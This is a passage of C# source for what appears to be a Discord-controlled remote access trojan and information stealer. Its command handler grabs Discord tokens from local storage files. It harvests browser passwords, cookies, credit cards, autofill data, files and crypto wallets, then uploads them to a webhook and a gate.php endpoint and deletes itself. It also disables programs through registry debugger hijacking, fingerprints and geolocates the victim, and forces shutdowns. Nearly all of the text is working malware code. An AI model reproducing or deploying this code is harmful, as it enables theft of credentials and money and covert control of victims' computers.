                        Keybd_event(VK_VOLUME_UP, MapVirtualKey(VK_VOLUME_UP, 0),
                            KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
                    }

                    embedGenerate("Volume",
                        "https://tchol.org/images/bloody-png-12.png",
                        "https://tchol.org/images/bloody-png-12.png",
                        "Name", Environment.UserName,
                        "Status", "UP",
                        "Value", b);
                    }
                    catch (Exception ex)
                    {
                        embedGenerate("Exception",
    "https://tchol.org/images/bloody-png-12.png",
    "https://tchol.org/images/bloody-png-12.png",
    "Message", ex.Message);
                    }

                }
                if (command.Contains("!volume down"))
                {
                    try
                    {
                    var messageToSend = command.Replace("!volume down", "");
                    var x = int.Parse(messageToSend);
                    var b = x.ToString();

                    for (var i = 0; i < x; i++)
                    {
                        Keybd_event(VK_VOLUME_DOWN, MapVirtualKey(VK_VOLUME_DOWN, 0), KEYEVENTF_EXTENDEDKEY, 0);
                        Keybd_event(VK_VOLUME_DOWN, MapVirtualKey(VK_VOLUME_DOWN, 0),
                            KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
                    }

                    embedGenerate("Volume",
                        "https://tchol.org/images/bloody-png-12.png",
                        "https://tchol.org/images/bloody-png-12.png",
                        "Name", Environment.UserName,
                        "Status", "DOWN",
                        "Value", b);
                    }
                    catch (Exception ex)
                    {
                        embedGenerate("Exception",
    "https://tchol.org/images/bloody-png-12.png",
    "https://tchol.org/images/bloody-png-12.png",
    "Message", ex.Message);
                    }
                }
                if (command.Contains("!volume mute"))
                {
                    try
                    {
                    Keybd_event(VK_VOLUME_MUTE, MapVirtualKey(VK_VOLUME_MUTE, 0), KEYEVENTF_EXTENDEDKEY, 0);
                    Keybd_event(VK_VOLUME_MUTE, MapVirtualKey(VK_VOLUME_MUTE, 0),
                        KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);

                    embedGenerate("Volume",
                        "https://tchol.org/images/bloody-png-12.png",
                        "https://tchol.org/images/bloody-png-12.png",
                        "Name", Environment.UserName,
                        "Status", "Mute");
                    }
                    catch (Exception ex)
                    {
                        embedGenerate("Exception",
    "https://tchol.org/images/bloody-png-12.png",
    "https://tchol.org/images/bloody-png-12.png",
    "Message", ex.Message);
                    }
                }

                if (command.Contains("!discordtoken"))
                {
                    try
                    {
                    var text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +
                               "\\discord\\Local Storage\\leveldb\\";
                    if (!Stealer_GetLDB(ref text) && !Stealer_Log(ref text))
                    {
                        //
                    }

                    Thread.Sleep(100);
                    var text2 = Stealer_GetToken(text, text.EndsWith(".log"));
                    if (text2 == "") text2 = "N/A";

                    var text1 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) +
                                "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\";
                    if (!Stealer_GetLDB(ref text1) && !Stealer_Log(ref text1))
                    {
                        //
                    }

                    Thread.Sleep(100);
                    var text3 = Stealer_GetToken(text1, text1.EndsWith(".log"));
                    if (text3 == "") text3 = "N/A";

                    embedGenerate("Discordtoken",
                        "https://tchol.org/images/bloody-png-12.png",
                        "https://tchol.org/images/bloody-png-12.png",
                        "Name", Environment.UserName,
                        "Status", "Grabbed",
                        "DiscordAPP", "``" + text2 + "``", 
                        "Google Chrome", "``" + text3 + "``");
                        if (text2.Contains("mfa"))
                        {
                            embedGenerate("Discordtoken",
                                "https://tchol.org/images/bloody-png-12.png",
                                "https://tchol.org/images/bloody-png-12.png",
                                "Name", Environment.UserName,
                                "Info", "2FA Activated");
                        }
                    }
                    catch (Exception ex)
                    {
                        embedGenerate("Exception",
                            "https://tchol.org/images/bloody-png-12.png",
                            "https://tchol.org/images/bloody-png-12.png",
                            "Message", ex.Message);
                    }
                }

                if (command.Contains("!processes"))
                {
                    try
                    {
                    var fs1 = new FileStream(
    "C:\\Users\\" + Environment.UserName +
    "\\AppData\\Roaming\\Microsoft\\Windows\\processes.txt", FileMode.OpenOrCreate,
    FileAccess.Write);
                    var writer = new StreamWriter(fs1);

                    var plist = Process.GetProcesses();

                    foreach (var prs in plist)
                        writer.Write(prs.ProcessName + "         (" + prs.PrivateMemorySize64 + ")" + "\n");
                    writer.Close();

                    var output = File.ReadAllText("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\processes.txt", Encoding.UTF8);
                    string output1 = output.Replace("\r", "").Replace("\n", "\\n");

                    embedGenerate("Processes",
                        "https://tchol.org/images/bloody-png-12.png",
                        "https://tchol.org/images/bloody-png-12.png",
                        "Name", Environment.UserName,
                        "Status", "Collected");

                    WebClient w = new WebClient();
                    w.UploadFile(webHook, "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\processes.txt");
                    }
                    catch (Exception ex)
                    {
                    }
                }

                if (command.Contains("!steal"))
                {
                    try
                    {
                    var url = "";
                    var dir = Environment.GetEnvironmentVariable("temp") + "\\" + Helper.GetHwid();

                    var workDir = dir + "\\Directory";
                    var browserDir = workDir + "\\Browsers";
                    var filesDir = workDir + "\\Files";
                    var cryptoDir = workDir + "\\Wallets";

                    Directory.CreateDirectory(workDir);
                    Directory.CreateDirectory(browserDir);
                    Directory.CreateDirectory(filesDir);
                    Directory.CreateDirectory(cryptoDir);
                    var text = "";
                    var pwd = Browsers.GetPasswords();
                    foreach (var i in pwd) text += i.ToString();
                    File.WriteAllText(
                        "C:\\Users\\" + Environment.UserName +
                        "\\AppData\\Roaming\\Microsoft\\Windows\\passwords.txt", text);
                    text = "";

                    var cki = Browsers.GetCookies();
                    foreach (var i in cki) text += i.ToString();
                    File.WriteAllText(
                        "C:\\Users\\" + Environment.UserName +
                        "\\AppData\\Roaming\\Microsoft\\Windows\\cookies.txt", text);
                    text = "";

                    var cc = Browsers.GetCards();
                    foreach (var i in cc) text += i.ToString();
                    File.WriteAllText(
                        "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\CC.txt",
                        text);
                    text = "";

                    var frm = Browsers.GetForms();
                    foreach (var i in frm) text += i.ToString();
                    File.WriteAllText(
                        "C:\\Users\\" + Environment.UserName +
                        "\\AppData\\Roaming\\Microsoft\\Windows\\autofill.txt", text);

                    Files.Desktop(filesDir);
                    Files.FileZilla(filesDir);

                    var wlt = Crypto.Steal(cryptoDir);

                    var zipName = dir + "\\" + Helper.GetHwid() + ".zip";
                    Helper.Zip(workDir, zipName);

                    Helper.SendFile(
                        string.Format(url + "/gate.php?hwid={0}&pwd={1}&cki={2}&cc={3}&frm={4}&wlt={5}",
                            Helper.GetHwid(), pwd.Count, cki.Count, cc.Count, frm.Count, wlt), zipName);

                    Helper.SelfDelete(dir, dir + "\\temp.exe");

                    embedGenerate("Processes",
                        "https://tchol.org/images/bloody-png-12.png",
                        "https://tchol.org/images/bloody-png-12.png",
                        "Name", Environment.UserName,
                        "Status", "Collected");

                    WebClient w = new WebClient();
                    w.UploadFile(webHook, "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\passwords.txt");
                    w.UploadFile(webHook, "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\cookies.txt");
                    w.UploadFile(webHook, "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\CC.txt");
                    w.UploadFile(webHook, "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\autofill.txt");
                    }
                    catch (Exception ex)
                    {
                        embedGenerate("Exception",
    "https://tchol.org/images/bloody-png-12.png",
    "https://tchol.org/images/bloody-png-12.png",
    "Message", ex.Message);
                    }
                }

                if (command.Contains("!program disable"))
                {
                    try
                    {
                    var messageToSend = command.Replace("!program disable", "").Replace(" ", "");

                    Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\" + messageToSend, "Debugger", "C:\\Windows\\System32\\" + get_unique_string(15) + ".exe");
                    foreach (var proc in Process.GetProcessesByName(messageToSend.Replace(".exe", ""))) proc.Kill();

                    embedGenerate("Program Disable",
                        "https://tchol.org/images/bloody-png-12.png",
                        "https://tchol.org/images/bloody-png-12.png",
                        "Name", Environment.UserName,
                        "Status", "Disabled",
                        "Program", messageToSend);
                    }
                    catch (Exception ex)
                    {
                        embedGenerate("Exception",
    "https://tchol.org/images/bloody-png-12.png",
    "https://tchol.org/images/bloody-png-12.png",
    "Message", ex.Message);
                    }
                }
                if (command.Contains("!program enable"))
                {
                    try
                    {
                    var messageToSend = command.Replace("!program enable", "").Replace(" ", "");
                    Registry.LocalMachine.DeleteSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\" + messageToSend);

                    embedGenerate("Program Enabled",
                        "https://tchol.org/images/bloody-png-12.png",
                        "https://tchol.org/images/bloody-png-12.png",
                        "Name", Environment.UserName,
                        "Status", "Enabled",
                        "Program", messageToSend);
                    }
                    catch (Exception ex)
                    {
                        embedGenerate("Exception",
    "https://tchol.org/images/bloody-png-12.png",
    "https://tchol.org/images/bloody-png-12.png",
    "Message", ex.Message);
                    }
                }

                if (command.Contains("!uninstall"))
                {
                    try
                    {

                        embedGenerate("Uninstall",
                        "https://tchol.org/images/bloody-png-12.png",
                        "https://tchol.org/images/bloody-png-12.png",
                        "Name", Environment.UserName,
                        "Status", "Uninstalled");

                    var exepath = Assembly.GetEntryAssembly().Location;
                    var info = new ProcessStartInfo("cmd.exe",
                        "/C ping 1.1.1.1 -n 1 -w 1 > Nul & Del \"" + exepath + "\"");
                    info.WindowStyle = ProcessWindowStyle.Hidden;
                    Process.Start(info).Dispose();
                    Environment.Exit(0);
                    }
                    catch (Exception ex)
                    {
                        embedGenerate("Exception",
    "https://tchol.org/images/bloody-png-12.png",
    "https://tchol.org/images/bloody-png-12.png",
    "Message", ex.Message);
                    }
                }

                if (command.Contains("!shutdown"))
                {
                    try
                    {
                        embedGenerate("Shutdown",
                        "https://tchol.org/images/bloody-png-12.png",
                        "https://tchol.org/images/bloody-png-12.png",
                        "Name", Environment.UserName,
                        "Status", "Shutting Down");

                    var psi = new ProcessStartInfo("shutdown", "/s /t 0");
                    psi.CreateNoWindow = true;
                    psi.UseShellExecute = false;
                    Process.Start(psi);
                    }
                    catch (Exception ex)
                    {
                        embedGenerate("Exception",
    "https://tchol.org/images/bloody-png-12.png",
    "https://tchol.org/images/bloody-png-12.png",
    "Message", ex.Message);
                    }
                }
                if (command.Contains("!restart"))
                {
                    try
                    {
                        embedGenerate("Shutdown",
                        "https://tchol.org/images/bloody-png-12.png",
                        "https://tchol.org/images/bloody-png-12.png",
                        "Name", Environment.UserName,
                        "Status", "Shutting Down");

                    var psi = new ProcessStartInfo("shutdown", "/r /t 0");
                    psi.CreateNoWindow = true;
                    psi.UseShellExecute = false;
                    Process.Start(psi);
                    }
                    catch (Exception ex)
                    {
                        embedGenerate("Exception",
    "https://tchol.org/images/bloody-png-12.png",
    "https://tchol.org/images/bloody-png-12.png",
    "Message", ex.Message);
                    }
                }
                if (command.Contains("!logoff"))
                {
                    try
                    {
                        embedGenerate("Shutdown",
                        "https://tchol.org/images/bloody-png-12.png",
                        "https://tchol.org/images/bloody-png-12.png",
                        "Name", Environment.UserName,
                        "Status", "Shutting Down");

                    var psi = new ProcessStartInfo("shutdown", "/l /t 0");
                    psi.CreateNoWindow = true;
                    psi.UseShellExecute = false;
                    Process.Start(psi);
                    }
                    catch (Exception ex)
                    {
                        embedGenerate("Exception",
    "https://tchol.org/images/bloody-png-12.png",
    "https://tchol.org/images/bloody-png-12.png",
    "Message", ex.Message);
                    }
                }

                if (command.Contains("!info"))
                {
                    try
                    {
                        long memKb;
                        GetPhysicallyInstalledSystemMemory(out memKb);

                        var mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
                        foreach (ManagementObject managementObject in mos.Get())
                        {
                            var OSName = managementObject["Caption"].ToString();
                            var OSVersion = Environment.OSVersion.ToString();
                            embedGenerate("Info",
                                "https://tchol.org/images/bloody-png-12.png",
                                "https://tchol.org/images/bloody-png-12.png",
                                "UserName", Environment.UserName,
                                "OS", OSName,
                                "OSVersion", OSVersion,
                                "AntiVirus", GetAntivirus(),
                                "Firewall", GetFirewall(),
                                "RAM", memKb / 1024 / 1024 + " GB of RAM installed.",
                                "Bios", GetBiosIdentifier(),
                                "Mainboard", GetMainboardIdentifier(),
                                "CPU", GetCpuName(),
                                "GPU", GetGpuName() + "\\n" + "**Lan IP**" + "\\n" + GetLanIp() + "\\n" + "**IP**" + "\\n" + GetIPAddress() + "\\n" + "**Mac Address**" + "\\n" + GetMacAddress() + "\\n" + "**Virtual Machine**" + "\\n" + DetectVirtualMachine().ToString() + "\\n" + "**PC Type**" + "\\n" + PCType() + "\\n" + "**Country**" + "\\n" + Country() + "\\n" + "**Time**" + "\\n" + DateTime.Now.ToString("HH:mm:ss tt"));
                        }
                    }
                    catch (Exception ex)
                    {
                        embedGenerate("Exception",
    "https://tchol.org/images/bloody-png-12.png",
    "https://tchol.org/images/bloody-png-12.png",
    "Message", ex.Message);
                    }
                }

                if (command.Contains("!geolocate"))
                {
                    IpInfo ipInfo = new IpInfo();
                    try
                    {
                        string info = new WebClient().DownloadString("http://ipinfo.io/" + GetIPAddress());
                        ipInfo = JsonConvert.DeserializeObject<IpInfo>(info);
                        RegionInfo myRI1 = new RegionInfo(ipInfo.Country);
                        ipInfo.Country = myRI1.EnglishName;



                        embedGenerate("Geolocate Output",
                            "https://tchol.org/images/bloody-png-12.png",
                            "https://tchol.org/images/bloody-png-12.png",
                            "Name", Environment.UserName,
                            "IP", ipInfo.Ip,
                            "Hostname", ipInfo.Hostname,
                            "City", ipInfo.City,
                            "Region", ipInfo.Region,
                            "Postal", ipInfo.Postal,
                            "Country", ipInfo.Country,
                            "Loc", ipInfo.Loc,
                            "Org", ipInfo.Org);
                    }
                    catch (Exception ex)
                    {
                        embedGenerate("Exception",
                            "https://tchol.org/images/bloody-png-12.png",
                            "https://tchol.org/images/bloody-png-12.png",
                            "Message", ex.Message);
                    }
                }


                //i removed audio play because it required NAudio (file size), just google it and you could add it back
                if (command.Contains("!audio play"))
                {
                    try
                    {
                    var messageToSend = command.Replace("!audio play", "");

                    embedGenerate("Audio",
                        "https://tchol.org/images/bloody-png-12.png",
                        "https://tchol.org/images/bloody-png-12.png",
                        "Name", Environment.UserName,
                        "Status", "Playing",
                        "Audio link", messageToSend);
                    }
                    catch (Exception ex)
                    {
                        embedGenerate("Exception",
                            "https://tchol.org/images/bloody-png-12.png",
                            "https://tchol.org/images/bloody-png-12.png",
                            "Message", ex.Message);
                    }

                }

                if (command.Contains("!discord manual"))
                {
                    try
                    {
                    var messageToSendx = command.Replace("!discord manual", "");
                    var messageToSendx1 = messageToSendx.Substring(0, 7);
                    var messageToSendx2 = messageToSendx1.Replace(" ", "");

                    var messageToSend = command.Replace("!discord manual", "");
                    var messageToSend1 = messageToSend.Replace("!discord manual" + " ", "");
                    var messageToSend2 = messageToSend1.Substring(messageToSend1.LastIndexOf(' ') + 1);

                    HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create($"https://discordapp.com/api/v6/invite/{messageToSendx2}");
                    httpWebRequest.Method = "POST";
                    httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0";
                    httpWebRequest.AutomaticDecompression = DecompressionMethods.GZip;
                    httpWebRequest.Headers.Add("Authorization", messageToSend2);
                    httpWebRequest.ContentLength = 0L;
                    HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();

                    embedGenerate("Discord Invite",
                        "https://tchol.org/images/bloody-png-12.png",
                        "https://tchol.org/images/bloody-png-12.png",
                        "Name", Environment.UserName,
                        "Status", "Joined",
                        "Token", messageToSend2,
                        "Invite", messageToSendx2);
                    }
                    catch (Exception ex)
                    {
                        embedGenerate("Exception",
                            "https://tchol.org/images/bloody-png-12.png",
                            "https://tchol.org/images/bloody-png-12.png",
                            "Message", ex.Message);
                    }

                }
            }
        } //Handles all the Commands




        public class IpInfo
        {

            [JsonProperty("ip")]
            public string Ip { get; set; }

            [JsonProperty("hostname")]
            public string Hostname { get; set; }

            [JsonProperty("city")]
            public string City { get; set; }

            [JsonProperty("region")]
            public string Region { get; set; }

            [JsonProperty("country")]
            public string Country { get; set; }

            [JsonProperty("loc")]
            public string Loc { get; set; }

            [JsonProperty("org")]
            public string Org { get; set; }

            [JsonProperty("postal")]
            public string Postal { get; set; }
        }

        #region other shit
        public static string Between(string STR, string FirstString, string LastString)
        {
            string FinalString;
            int Pos1 = STR.IndexOf(FirstString) + FirstString.Length;
            int Pos2 = STR.IndexOf(LastString);
            FinalString = STR.Substring(Pos1, Pos2 - Pos1);
            return FinalString;
        }
        public static IEnumerable<String> SplitInParts(String s, Int32 partLength)
        {
            if (s == null)
                throw new ArgumentNullException("s");
            if (partLength <= 0)
                throw new ArgumentException("Part length has to be positive.", "partLength");

            for (var i = 0; i < s.Length; i += partLength)
                yield return s.Substring(i, Math.Min(partLength, s.Length - i));
        }


        private static string GetUptime()
        {
            return (DateTime.Now - Process.GetCurrentProcess().StartTime).ToString(@"dd\.hh\:mm\:ss");
        }

        private static string GetHeapSize()
        {
            return Math.Round(GC.GetTotalMemory(true) / (1024.0 * 1024.0), 2).ToString();
        }

        private static string get_unique_string(int string_length)
        {
            using (var rng = new RNGCryptoServiceProvider())
            {
                var bit_count = (string_length * 6);
                var byte_count = ((bit_count + 7) / 8); // rounded up
                var bytes = new byte[byte_count];
                rng.GetBytes(bytes);
                return Convert.ToBase64String(bytes);
            }
        }

        private static void SetMonitorInState(MonitorState state)
        {
            SendMessage(0xFFFF, 0x112, 0xF170, (int)state);
        }

        public enum MonitorState
        {
            MonitorStateOn = -1,
            MonitorStateOff = 2,
            MonitorStateStandBy = 1
        }

        public static string PCType()
        {
            string ComputerType;
            if (SystemInformation.PowerStatus.BatteryChargeStatus == BatteryChargeStatus.NoSystemBattery)
            {
                ComputerType = "Desktop";
                return ComputerType;
            }

            ComputerType = "Laptop";
            return ComputerType;
        }

        public static string GetAntivirus()
        {
            try
            {
                var antivirusName = string.Empty;
                // starting with Windows Vista we must use the root\SecurityCenter2 namespace
                var scope = PlatformHelper.VistaOrHigher ? "root\\SecurityCenter2" : "root\\SecurityCenter";
                var query = "SELECT * FROM AntivirusProduct";

                using (var searcher = new ManagementObjectSearcher(scope, query))
                {
                    foreach (ManagementObject mObject in searcher.Get()) antivirusName += mObject["displayName"] + "; ";
                }

                antivirusName = RemoveLastChars(antivirusName);

                return !string.IsNullOrEmpty(antivirusName) ? antivirusName : "N/A";
            }
            catch
            {
                return "Unknown";
            }
        }

        public static string GetBiosIdentifier()
        {
            try
            {
                var biosIdentifier = string.Empty;
                var query = "SELECT * FROM Win32_BIOS";

                using (var searcher = new ManagementObjectSearcher(query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        biosIdentifier = mObject["Manufacturer"].ToString();
                        break;
                    }
                }

                return !string.IsNullOrEmpty(biosIdentifier) ? biosIdentifier : "N/A";
            }
            catch
            {
            }

            return "Unknown";
        }

        public static string GetCpuName()
        {
            try
            {
                var cpuName = string.Empty;
                var query = "SELECT * FROM Win32_Processor";

                using (var searcher = new ManagementObjectSearcher(query))
                {
                    foreach (ManagementObject mObject in searcher.Get()) cpuName += mObject["Name"] + "; ";
                }

                cpuName = RemoveLastChars(cpuName);

                return !string.IsNullOrEmpty(cpuName) ? cpuName : "N/A";
            }
            catch
            {
            }

            return "Unknown";
        }

        public static string GetFirewall()
        {
            try
            {
                var firewallName = string.Empty;
                // starting with Windows Vista we must use the root\SecurityCenter2 namespace
                var scope = PlatformHelper.VistaOrHigher ? "root\\SecurityCenter2" : "root\\SecurityCenter";
                var query = "SELECT * FROM FirewallProduct";

                using (var searcher = new ManagementObjectSearcher(scope, query))
                {
                    foreach (ManagementObject mObject in searcher.Get()) firewallName += mObject["displayName"] + "; ";
                }

                firewallName = RemoveLastChars(firewallName);

                return !string.IsNullOrEmpty(firewallName) ? firewallName : "N/A";
            }
            catch
            {
                return "Unknown";
            }
        }

        public static string GetFormattedMacAddress(string macAddress)
        {
            return macAddress.Length != 12
                ? "00:00:00:00:00:00"
                : Regex.Replace(macAddress, "(.{2})(.{2})(.{2})(.{2})(.{2})(.{2})", "$1:$2:$3:$4:$5:$6");
        }

        public static string Country()
        {
            var lpLCData = new StringBuilder(256);
            var ret = GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SENGCOUNTRY, lpLCData, lpLCData.Capacity);
            if (ret > 0)
                return lpLCData.ToString().Substring(0, ret - 1);
            return string.Empty;
        }

        public static bool DetectVirtualMachine()
        {
            using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem")
            ) //Using System.Management (Add Reference)
            {
                using (var items = searcher.Get())
                {
                    foreach (var item in items)
                    {
                        var manufacturer = item["Manufacturer"].ToString().ToLower();
                        if (manufacturer == "microsoft corporation" &&
                            item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")
                            || manufacturer.Contains("vmware")
                            || item["Model"].ToString() == "VirtualBox")
                            return true;
                    }
                }
            }

            return false;
        }

        public static string GetGpuName()
        {
            try
            {
                var gpuName = string.Empty;
                var query = "SELECT * FROM Win32_DisplayConfiguration";

                using (var searcher = new ManagementObjectSearcher(query))
                {
                    foreach (ManagementObject mObject in searcher.Get()) gpuName += mObject["Description"] + "; ";
                }

                gpuName = RemoveLastChars(gpuName);

                return !string.IsNullOrEmpty(gpuName) ? gpuName : "N/A";
            }
            catch
            {
                return "Unknown";
            }
        }

        public static string GetIPAddress()
        {
            var IPADDRESS = new WebClient().DownloadString("http://ipv4bot.whatismyipaddress.com/");
            return IPADDRESS;
        }

        public static string GetLanIp()
        {
            foreach (var ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                var gatewayAddress = ni.GetIPProperties().GatewayAddresses.FirstOrDefault();
                if (gatewayAddress != null) //exclude virtual physical nic with no default gateway
                    if (ni.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 ||
                        ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet &&
                        ni.OperationalStatus == OperationalStatus.Up)
                        foreach (var ip in ni.GetIPProperties().UnicastAddresses)
                        {
                            if (ip.Address.AddressFamily != AddressFamily.InterNetwork ||
                                ip.AddressPreferredLifetime == uint.MaxValue) // exclude virtual network addresses
                                continue;

                            return ip.Address.ToString();
                        }
            }

            return "-";
        }

        public static string GetMacAddress()
        {
            foreach (var ni in NetworkInterface.GetAllNetworkInterfaces())
                if (ni.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 ||
                    ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet &&
                    ni.OperationalStatus == OperationalStatus.Up)
                {
                    var foundCorrect = false;
                    foreach (var ip in ni.GetIPProperties().UnicastAddresses)
                    {
                        if (ip.Address.AddressFamily != AddressFamily.InterNetwork ||
                            ip.AddressPreferredLifetime == uint.MaxValue) // exclude virtual network addresses
                            continue;

                        foundCorrect = ip.Address.ToString() == GetLanIp();
                    }

                    if (foundCorrect)
                        return GetFormattedMacAddress(ni.GetPhysicalAddress().ToString());
                }

            return "-";
        }

        public static string GetMainboardIdentifier()
        {
            try
            {
                var mainboardIdentifier = string.Empty;
                var query = "SELECT * FROM Win32_BaseBoard";

                using (var searcher = new ManagementObjectSearcher(query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        mainboardIdentifier = mObject["Manufacturer"] + mObject["SerialNumber"].ToString();
                        break;
                    }
                }

                return !string.IsNullOrEmpty(mainboardIdentifier) ? mainboardIdentifier : "N/A";
            }
            catch
            {
            }

            return "Unknown";
        }

        public static string RemoveLastChars(string input, int amount = 2)
        {
            if (input.Length > amount)
                input = input.Remove(input.Length - amount);
            return input;
        }
        #endregion

        #region geolocate
        public class IPData
        {
            public string status { get; set; }
            public string country { get; set; }
            public string countryCode { get; set; }
            public string region { get; set; }
            public string regionName { get; set; }
            public string city { get; set; }
            public string zip { get; set; }
            public string lat { get; set; }
            public string lon { get; set; }
            public string timezone { get; set; }
            public string isp { get; set; }
            public string org { get; set; }
            public string @as { get; set; }
            public string query { get; set; }
        }
        #endregion

        #region discord token stealer

        private static bool Stealer_GetLDB(ref string string_0)
        {
            if (Directory.Exists(string_0))
            {
                foreach (var fileInfo in new DirectoryInfo(string_0).GetFiles())
                    if (fileInfo.Name.EndsWith(".ldb") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
                    {
                        string_0 += fileInfo.Name;
                        return string_0.EndsWith(".ldb");
                    }

                return string_0.EndsWith(".ldb");
            }

            return false;
        }

        private static string Stealer_GetToken(string string_0, bool bool_0 = false)
        {
            var bytes = File.ReadAllBytes(string_0);
            var @string = Encoding.UTF8.GetString(bytes);
            var text = "";
            var text2 = @string;
            while (text2.Contains("oken"))
            {
                var array = Stealer_IndexOfShit(text2).Split('"');
                text = array[0];
                text2 = string.Join("\"", array);
                if (bool_0 && text.Length == 59) break;
            }

            return text;
        }

        private static string Stealer_IndexOfShit(string string_0)
        {
            var array = string_0.Substring(string_0.IndexOf("oken") + 4).Split('"');
            var list = new List<string>();
            list.AddRange(array);
            list.RemoveAt(0);
            array = list.ToArray();
            return string.Join("\"", array);
        }

        private static bool Stealer_Log(ref string string_0)
        {
            if (Directory.Exists(string_0))
            {
                foreach (var fileInfo in new DirectoryInfo(string_0).GetFiles())
                    if (fileInfo.Name.EndsWith(".log") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
                    {
                        string_0 += fileInfo.Name;
                        return string_0.EndsWith(".log");
                    }

                return string_0.EndsWith(".log");
            }

            return false;
        }

        #endregion discord token stealer
    }

    class Aes256CbcEncrypter
    {
        private static readonly Encoding encoding = Encoding.UTF8;

        public static string Encrypt(string plainText, string key)
        {
            try
            {
                RijndaelManaged aes = new RijndaelManaged();
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.PKCS7;
                aes.Mode = CipherMode.CBC;

                aes.Key = encoding.GetBytes(key);
                aes.GenerateIV();

                ICryptoTransform AESEncrypt = aes.CreateEncryptor(aes.Key, aes.IV);
                byte[] buffer = encoding.GetBytes(plainText);

                string encryptedText = Convert.ToBase64String(AESEncrypt.TransformFinalBlock(buffer, 0, buffer.Length));

                String mac = "";

                mac = BitConverter.ToString(HmacSHA256(Convert.ToBase64String(aes.IV) + encryptedText, key)).Replace("-", "").ToLower();

                var keyValues = new Dictionary<string, object>
                {
                    { "iv", Convert.ToBase64String(aes.IV) },
                    { "value", encryptedText },
                    { "mac", mac },
                };

                JavaScriptSerializer serializer = new JavaScriptSerializer();

                return Convert.ToBase64String(encoding.GetBytes(serializer.Serialize(keyValues)));
            }
            catch (Exception e)
            {
                throw new Exception("Error encrypting: " + e.Message);
            }
        }

        public static string Decrypt(string plainText, string key)
        {
            try
            {
                RijndaelManaged aes = new RijndaelManaged();
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.PKCS7;
                aes.Mode = CipherMode.CBC;
                aes.Key = encoding.GetBytes(key);

                // Base 64 decode
                byte[] base64Decoded = Convert.FromBase64String(plainText);
                string base64DecodedStr = encoding.GetString(base64Decoded);

                // JSON Decode base64Str
                JavaScriptSerializer ser = new JavaScriptSerializer();
                var payload = ser.Deserialize<Dictionary<string, string>>(base64DecodedStr);

                aes.IV = Convert.FromBase64String(payload["iv"]);

                ICryptoTransform AESDecrypt = aes.CreateDecryptor(aes.Key, aes.IV);
                byte[] buffer = Convert.FromBase64String(payload["value"]);

                return encoding.GetString(AESDecrypt.TransformFinalBlock(buffer, 0, buffer.Length));
            }
            catch (Exception e)
            {
                throw new Exception("Error decrypting: " + e.Message);
            }
        }

        static byte[] HmacSHA256(String data, String key)
        {
            using (HMACSHA256 hmac = new HMACSHA256(encoding.GetBytes(key)))
            {
                return hmac.ComputeHash(encoding.GetBytes(data));
            }
        }
    }
}
